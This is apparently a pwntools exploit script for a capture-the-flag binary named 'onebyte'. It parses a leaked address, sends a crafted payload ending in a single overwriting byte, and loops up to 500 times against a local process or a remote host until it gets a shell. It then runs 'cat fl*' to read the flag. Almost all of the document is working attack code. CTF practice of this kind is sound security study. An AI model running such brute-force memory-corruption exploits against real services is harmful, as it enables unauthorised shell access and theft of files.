from pwn import *
import sys
import time
context.log_level = "error"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
for i in range(500):
    if i % 100 == 0:
        print(i)
    if len(sys.argv) == 1:
        r = process("./onebyte",aslr=True)
        if args.GDB:
            gdb.attach(r,'b *main+107')
    elif len(sys.argv) == 3:
        r = remote(sys.argv[1], sys.argv[2])
    else:
        print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
        sys.exit(1)
    r.recvuntil(b'Free junk: ')
    leak = int(r.recvline().replace(b'\n',b'').decode(),16) - 0x565561bd + 0x56555000
    print(hex(leak))
    r.recvuntil(b'Your turn: ')
    r.send(p32(leak + 4611) * 4 + b'\x50') # Local is \x54 but remote \x50 works
    try:
        r.sendline("cat fl*")
        res = r.recvall(timeout=0.5)
        # if b"Fatal error" in res:
        #     r.interactive()
        #     break
        if res != b'':
            print(res)
            r.interactive()
            break
        else:
            r.close()
    except:
        r.close()

'''
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
'''

'''
cat /home/`whoami`/f*

'''